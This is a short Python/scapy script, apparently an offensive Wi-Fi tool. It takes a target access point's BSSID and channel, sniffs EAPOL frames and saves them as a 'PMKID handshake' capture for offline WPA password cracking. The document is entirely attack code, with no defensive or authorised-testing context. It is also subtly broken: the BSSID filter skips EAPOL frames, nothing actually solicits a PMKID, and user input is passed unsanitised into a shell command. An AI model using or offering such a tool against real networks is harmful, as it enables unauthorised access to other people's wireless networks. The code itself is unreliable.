from scapy.all import *
import os

pmkid_file = "pmkid.pcap"
pmkid_packets = []

def capture_pmkid(iface):
    print(f"[*] Setting {iface} to channel {channel}...")
    os.system(f"iwconfig {iface} channel {channel}")

    def handler(pkt):
        # Filter by target BSSID
        if pkt.haslayer(Dot11Beacon):
            if pkt.addr2.lower() != target_bssid:
                return

        if pkt.haslayer(EAPOL):
            pmkid_packets.append(pkt)
            print(f"[+] PMKID-related EAPOL frame from {pkt.addr2}")
            if len(pmkid_packets) >= 1:
                wrpcap(pmkid_file, pmkid_packets)
                print(f"[âœ”] PMKID captured and saved to {pmkid_file}")
                exit()

    sniff(iface=iface, prn=handler, store=0)

if __name__ == "__main__":
    iface = input("Monitor Mode Interface (e.g., wlan0mon): ").strip()
    target_bssid = input("Target AP BSSID (MAC address): ").strip().lower()
    channel = input("Target Channel (e.g., 6): ").strip()

    print(f"[*] Capturing PMKID handshake from {target_bssid} on channel {channel}...")
    capture_pmkid(iface)
